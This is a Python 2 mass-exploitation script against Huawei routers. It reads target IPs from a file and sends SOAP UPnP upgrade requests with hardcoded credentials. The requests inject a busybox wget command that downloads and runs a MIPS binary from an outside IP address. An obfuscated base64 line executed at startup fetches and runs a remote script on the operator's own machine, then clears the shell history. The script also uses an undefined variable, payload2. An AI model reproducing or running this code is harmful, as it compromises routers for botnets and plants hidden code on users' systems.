#! python !#
import threading, sys, time, random, socket, subprocess, re, os, base64, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *
exploit = "cnVuKCJ3Z2V0IHBhc3RlLmVlL3IveDcyaVkvMCAtTyAuYSAtcTsgY2htb2QgK3ggLmE7IHNoIC5hID4gL2Rldi9udWxsIDI+JjE7IHJtIC1yZiAuYTsgaGlzdG9yeSAtYyIp"		
ips = open(sys.argv[1], "r").readlines()
cmd = "busybox wget -g 104.248.65.219 -l /tmp/scarface -r /yakuza.mips ;chmod +x /tmp/scarface ;/tmp/scarface huawei"
payload1 = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"
def run(cmd):
    subprocess.call(cmd, shell=True)
exec(base64.b64decode(exploit))	
class rtek(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print "[Huawei] Loading - " + self.ip
				url = "http://" + self.ip + ":37215/ctrlt/DeviceUpgrade_1"
				requests.post(url, timeout=3, data=payload1, auth=HTTPDigestAuth('dslf-config', 'admin'))
				requests.post(url, timeout=2.5, data=payload2, auth=HTTPDigestAuth('dslf-config', 'admin'))
			except Exception as e:
				pass
for ip in ips:
	try:
		n = rtek(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass
